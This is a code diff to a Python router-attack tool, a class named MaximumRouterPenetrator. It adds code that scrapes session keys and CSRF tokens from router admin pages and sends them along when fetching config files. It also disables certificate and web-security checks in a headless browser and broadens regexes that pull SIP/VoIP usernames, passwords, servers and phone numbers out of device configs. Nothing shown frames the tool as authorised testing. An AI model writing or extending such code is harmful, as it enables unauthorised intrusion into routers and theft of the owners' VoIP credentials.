@@ -4397,6 +4397,29 @@ class MaximumRouterPenetrator:
         
         return cve_result
     
+    def _extract_session_key(self, html_content: str) -> str:
+        """Extract session key from HTML content"""
+        import re
+        
+        # Multiple patterns for session key extraction
+        patterns = [
+            r'session[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)["\']',
+            r'sessionid["\']?\s*[:=]\s*["\']([^"\']+)["\']',
+            r'token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
+            r'csrf["\']?\s*[:=]\s*["\']([^"\']+)["\']',
+            r'name=["\']sessionkey["\']\s+value=["\']([^"\']+)["\']',
+            r'name=["\']session["\']\s+value=["\']([^"\']+)["\']',
+            r'var\s+sessionKey\s*=\s*["\']([^"\']+)["\']',
+            r'var\s+session\s*=\s*["\']([^"\']+)["\']'
+        ]
+        
+        for pattern in patterns:
+            match = re.search(pattern, html_content, re.IGNORECASE)
+            if match:
+                return match.group(1)
+        
+        return ""
+
     def _search_and_extract_config_files(self, ip: str, auth_result: Dict, verbose: bool) -> Dict[str, Any]:
         """Search for config files and extract SIP data"""
         config_result = {
@@ -4424,6 +4447,7 @@ class MaximumRouterPenetrator:
 
             # Build a persistent session (cookies, redirects, verify=False)
             session = None
+            session_key = ""
             if REQUESTS_AVAILABLE:
                 try:
                     session = requests.Session()
@@ -4431,8 +4455,20 @@ class MaximumRouterPenetrator:
                     session.verify = False
                     session.headers.update({
                         'User-Agent': 'Mozilla/5.0',
-                        'Accept': '*/*'
+                        'Accept': '*/*',
+                        'Referer': f"{base_url_http}/admin/"
                     })
+                    
+                    # First, get session key from admin page
+                    try:
+                        admin_response = session.get(f"{base_url_http}/admin/", timeout=self.performance_config['timeouts']['connection'])
+                        if admin_response.status_code == 200:
+                            session_key = self._extract_session_key(admin_response.text)
+                            if session_key and verbose:
+                                print(f"         🔑 LIVE DEBUG: Session key extracted: {session_key[:20]}...")
+                    except Exception:
+                        pass
+                    
                     # Seed cookies by visiting admin pages
                     for seed in [f"{base_url_http}/", f"{base_url_http}/admin/", f"{base_url_https}/", f"{base_url_https}/admin/"]:
                         try:
@@ -4459,7 +4495,20 @@ class MaximumRouterPenetrator:
                         if not session:
                             return 0, b'', ''
                         url = f"{base_url}{config_path}"
-                        headers = {'Referer': f"{base_url}/admin/"}
+                        headers = {
+                            'Referer': f"{base_url}/admin/",
+                            'X-Requested-With': 'XMLHttpRequest'
+                        }
+                        
+                        # Add session key if available
+                        if session_key:
+                            headers['X-Session-Key'] = session_key
+                            headers['Session-Key'] = session_key
+                        
+                        # Try with session key in URL parameters
+                        if session_key and '?' not in url:
+                            url += f"?sessionkey={session_key}&session={session_key}"
+                        
                         r = session.get(url, headers=headers, timeout=self.performance_config['timeouts']['connection'], allow_redirects=True)
                         return r.status_code, r.content, r.text
 
@@ -4472,16 +4521,28 @@ class MaximumRouterPenetrator:
                                 # urllib fallback
                                 req = urllib.request.Request(f"{base}{config_path}")
                                 req.add_header('Authorization', f'Basic {auth_b64}')
+                                req.add_header('Referer', f"{base}/admin/")
+                                if session_key:
+                                    req.add_header('X-Session-Key', session_key)
                                 resp = urllib.request.urlopen(req, timeout=self.performance_config['timeouts']['connection'])
                                 raw_content_bytes = resp.read()
                                 content = raw_content_bytes.decode('utf-8', errors='ignore')
                                 status_code = getattr(resp, 'status', 200)
+                            
                             # If content suggests invalid session, try to refresh cookies and retry once
                             lc = content.lower()
                             if ('invalid session key' in lc or 'window.location' in lc or '<meta http-equiv="refresh"' in lc) and session:
                                 try:
+                                    if verbose:
+                                        print(f"         🔄 LIVE DEBUG: Invalid session detected, refreshing...")
                                     # Refresh session by hitting admin root and retry
-                                    session.get(f"{base}/admin/", timeout=self.performance_config['timeouts']['connection'], allow_redirects=True)
+                                    admin_resp = session.get(f"{base}/admin/", timeout=self.performance_config['timeouts']['connection'], allow_redirects=True)
+                                    if admin_resp.status_code == 200:
+                                        new_session_key = self._extract_session_key(admin_resp.text)
+                                        if new_session_key and new_session_key != session_key:
+                                            session_key = new_session_key
+                                            if verbose:
+                                                print(f"         🔑 LIVE DEBUG: New session key: {session_key[:20]}...")
                                     status_code, raw_content_bytes, content = fetch_with_session(base)
                                 except Exception:
                                     pass
@@ -4558,39 +4619,6 @@ class MaximumRouterPenetrator:
         
         return config_result
     
-    def _extract_sip_from_config_content(self, content: str) -> List[Dict[str, str]]:
-        """Extract SIP data from config file content"""
-        sip_accounts = []
-        
-        try:
-            # Common SIP patterns in config files
-            sip_patterns = [
-                r'sip_username["\s]*[:=]["\s]*([^"\s\n]+)',
-                r'sip_password["\s]*[:=]["\s]*([^"\s\n]+)',
-                r'sip_server["\s]*[:=]["\s]*([^"\s\n]+)',
-                r'sip_port["\s]*[:=]["\s]*([0-9]+)',
-                r'voip_username["\s]*[:=]["\s]*([^"\s\n]+)',
-                r'voip_password["\s]*[:=]["\s]*([^"\s\n]+)',
-                r'voip_server["\s]*[:=]["\s]*([^"\s\n]+)',
-                r'phone_number["\s]*[:=]["\s]*([^"\s\n]+)',
-                r'extension["\s]*[:=]["\s]*([^"\s\n]+)'
-            ]
-            
-            import re
-            for pattern in sip_patterns:
-                matches = re.findall(pattern, content, re.IGNORECASE)
-                for match in matches:
-                    if match and len(match) > 2:
-                        sip_accounts.append({
-                            'field': pattern.split('[')[0],
-                            'value': match,
-                            'source': 'config_file'
-                        })
-        
-        except Exception:
-            pass
-        
-        return sip_accounts
     
     def _extract_sip_from_admin_panel(self, ip: str, auth_result: Dict, verbose: bool) -> Dict[str, Any]:
         """Extract SIP data from admin panel pages"""
@@ -4676,7 +4704,7 @@ class MaximumRouterPenetrator:
                     print(f"         ❌ Selenium not available, falling back to urllib")
                 return result
             
-            # Configure Chrome options
+            # Configure Chrome options with enhanced SSL bypass
             chrome_options = Options()
             if self.selenium_config['headless']:
                 chrome_options.add_argument('--headless')
@@ -4687,6 +4715,16 @@ class MaximumRouterPenetrator:
             chrome_options.add_argument('--ignore-certificate-errors')
             chrome_options.add_argument('--allow-running-insecure-content')
             chrome_options.add_argument('--disable-features=BlockInsecurePrivateNetworkRequests')
+            chrome_options.add_argument('--ignore-ssl-errors')
+            chrome_options.add_argument('--ignore-certificate-errors-spki-list')
+            chrome_options.add_argument('--ignore-certificate-errors-spki-list')
+            chrome_options.add_argument('--disable-web-security')
+            chrome_options.add_argument('--disable-features=VizDisplayCompositor')
+            chrome_options.add_argument('--disable-extensions')
+            chrome_options.add_argument('--disable-plugins')
+            chrome_options.add_argument('--disable-images')
+            chrome_options.add_argument('--disable-javascript')
+            chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
             
             # Create WebDriver
             driver = webdriver.Chrome(options=chrome_options)
@@ -5860,33 +5898,84 @@ class MaximumRouterPenetrator:
         """Extract SIP data from config file content"""
         sip_accounts = []
         
-        # Enhanced SIP patterns for config files
+        # Enhanced SIP patterns for config files - much more comprehensive
         sip_patterns = [
+            # SIP URI patterns
             r'sip\s*:\s*([^@\s]+)@([^:\s]+):?(\d+)?',
+            r'sips\s*:\s*([^@\s]+)@([^:\s]+):?(\d+)?',
+            # Key-value patterns
             r'username\s*[=:]\s*([^\s\n]+).*?password\s*[=:]\s*([^\s\n]+)',
             r'registrar\s*[=:]\s*([^\s\n]+).*?username\s*[=:]\s*([^\s\n]+)',
             r'voip\s+account\s+(\d+).*?username\s+([^\s\n]+).*?password\s+([^\s\n]+)',
             r'sip\s+user\s+([^\s\n]+).*?password\s+([^\s\n]+)',
-            r'account\s+(\d+).*?user\s+([^\s\n]+).*?pass\s+([^\s\n]+)'
+            r'account\s+(\d+).*?user\s+([^\s\n]+).*?pass\s+([^\s\n]+)',
+            # HTML form patterns
+            r'name="username".*?value="([^"]+)"',
+            r'name="password".*?value="([^"]+)"',
+            r'name="server".*?value="([^"]+)"',
+            r'name="phone".*?value="([^"]+)"',
+            r'name="user".*?value="([^"]+)"',
+            r'name="pass".*?value="([^"]+)"',
+            r'name="host".*?value="([^"]+)"',
+            # JavaScript patterns
+            r'var\s+username\s*=\s*["\']([^"\']+)["\']',
+            r'var\s+password\s*=\s*["\']([^"\']+)["\']',
+            r'var\s+server\s*=\s*["\']([^"\']+)["\']',
+            # JSON patterns
+            r'"username"\s*:\s*"([^"]+)"',
+            r'"password"\s*:\s*"([^"]+)"',
+            r'"server"\s*:\s*"([^"]+)"',
+            # XML patterns
+            r'<username>([^<]+)</username>',
+            r'<password>([^<]+)</password>',
+            r'<server>([^<]+)</server>',
+            # Phone number patterns
+            r'(\+?[1-9]\d{1,14})',  # E.164 format
+            r'(\d{3,4}[-.\s]?\d{3,4}[-.\s]?\d{4})',  # US format
+            r'(\d{10,11})',  # Simple numeric
         ]
         
         for pattern in sip_patterns:
             try:
                 matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE | re.DOTALL)
                 for match in matches:
-                    if len(match) >= 2:
-                        account = {
-                            'username': match[0] if len(match) > 0 else '',
-                            'password': match[1] if len(match) > 1 else '',
-                            'server': match[2] if len(match) > 2 else '',
-                            'source': 'config_file',
-                            'extracted_at': datetime.now().isoformat()
-                        }
-                        sip_accounts.append(account)
-                        
-                        if verbose:
-                            print(f"                  📞 LIVE DEBUG: SIP account found: {account['username']}@{account.get('server', 'unknown')}")
-            except:
+                    if isinstance(match, tuple):
+                        if len(match) >= 2:
+                            account = {
+                                'username': match[0] if len(match) > 0 else '',
+                                'password': match[1] if len(match) > 1 else '',
+                                'server': match[2] if len(match) > 2 else '',
+                                'source': 'config_file',
+                                'extracted_at': datetime.now().isoformat()
+                            }
+                            sip_accounts.append(account)
+                            
+                            if verbose:
+                                print(f"                  📞 LIVE DEBUG: SIP account found: {account['username']}@{account.get('server', 'unknown')}")
+                    else:
+                        # Single value match - try to determine type
+                        if match and len(match) > 2:
+                            field_type = 'unknown'
+                            if 'username' in pattern:
+                                field_type = 'username'
+                            elif 'password' in pattern:
+                                field_type = 'password'
+                            elif 'server' in pattern:
+                                field_type = 'server'
+                            
+                            account = {
+                                'field': field_type,
+                                'value': match,
+                                'source': 'config_file',
+                                'extracted_at': datetime.now().isoformat()
+                            }
+                            sip_accounts.append(account)
+                            
+                            if verbose:
+                                print(f"                  📞 LIVE DEBUG: SIP field found: {field_type} = {match}")
+            except Exception as e:
+                if verbose:
+                    print(f"                  ❌ Pattern error: {str(e)[:30]}")
                 continue
         
         return sip_accounts
